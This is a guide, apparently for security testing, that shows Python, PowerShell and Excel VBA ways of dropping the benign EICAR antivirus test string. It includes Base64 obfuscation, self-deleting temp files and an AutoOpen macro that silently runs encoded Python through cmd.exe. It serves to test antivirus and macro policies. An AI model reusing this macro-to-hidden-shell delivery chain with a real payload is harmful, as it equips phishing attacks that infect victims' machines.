Breakdown of the EICAR Test Variants


🧱 1. Basic Python Dropper
``` python
EICAR_STRING = "X5O!...$H+H*"
with open("eicar.com", "w") as f:
    f.write(EICAR_STRING)
```

- What it does: Writes the known EICAR test string to disk (eicar.com).
- Purpose: Static AV signature test.
- Detection chance: 100% if AV is active.

---

🧅 2. Obfuscated Dropper
``` python
encoded = "Base64_EICAR_String"
decoded = base64.b64decode(encoded).decode('ascii')
with open("eicar_obf.com", "w") as f:
    f.write(decoded)
```
- What it does: Hides the EICAR string in Base64, decodes it at runtime.
- Purpose: Simulates basic payload encoding like malware often uses.
- Detection chance: Lower unless AV/EDR inspects script behavior.

---

🧠 3. In-Memory Execution
A. subprocess with echo
``` python
cmd = f'echo {eicar}'
subprocess.run(cmd, shell=True)
```
- What it does: Uses system shell to echo the EICAR string.
- Purpose: Mimics droppers that execute payloads in memory or with LOLBins (Living Off the Land Binaries).
- Detection chance: Medium to high, depending on AV script monitoring.

 ---

B. tempfile with auto-deletion 
``` python
with tempfile.NamedTemporaryFile(...) as tmp:
    tmp.write(eicar.encode())
os.remove(tmp.name)
```
- What it does: Creates a temp file, writes the string, deletes it quickly.
- Purpose: Simulates malware that cleans up after itself.
- Detection chance: Depends on AV reaction time.

---

C. PowerShell Injection
``` python
powershell_cmd = '$e="..."; [System.Text.Encoding]::ASCII.GetBytes($e) | Out-Null'
subprocess.run(["powershell", "-Command", powershell_cmd])
```
- What it does: Runs PowerShell to generate EICAR in memory.
- Purpose: Simulates real-world fileless malware or script-based attacks.
- Detection chance: Very high for good EDRs.

---

🪤 1. Excel VBA Macro → Python Dropper
- This simulates phishing or initial access where:
- A malicious Excel document has a macro (VBA script).
- The macro launches Python to execute a payload (e.g., an EICAR dropper).
``` vba
Sub AutoOpen()
    Dim pyCommand As String
    pyCommand = "cmd.exe /c python -c ""import base64;exec(base64.b64decode('aW1wb3J0IHdpcnRlOyB3aXJ0ZSgiWDVPKVB...==' ))"""
    
    Shell pyCommand, vbHide
End Sub
```
- What it does:
    - AutoOpen runs when the document is opened.
    - It constructs a command to run python -c <payload>.
    - The Python payload is Base64-encoded for obfuscation.
- What the Python does: Writes or generates the EICAR string.

---

📦 2. Embedded Python Payload
Here’s what the payload might do before it’s base64-encoded:
``` python
import base64

eicar = base64.b64decode("WDVPKVB...").decode()
with open("eicar.com", "w") as f:
    f.write(eicar)
```
Then you Base64-encode this whole Python snippet and embed it into the VBA macro.
You can encode it like this from your terminal:
``` bash
echo "import base64; eicar=base64.b64decode('...'); open('eicar.com','w').write(eicar)" | base64
```
Use the output in the VBA code.

---

🧠 Why This Is Useful (and Dangerous)
Feature	                        Use Case
Mimics real malware delivery	Macros calling external scripts is a classic attack chain.
Bypasses static detection	    If AV only scans static VBA, this may get missed.
Tests macro policies	        Useful for seeing if macro-blocking policies (e.g., in MS Defender) work.
Simulates phishing vectors	    This mimics malware in malicious attachments.

🛑 Precautions
- ⚠️ Never test this outside of isolated, controlled lab environments.
- ⚠️ Excel must have macros enabled — modern Office versions block unsigned macros by default.
- ✅ Use AppLocker, WDAC, and macro policies in enterprise environments to block this vector.




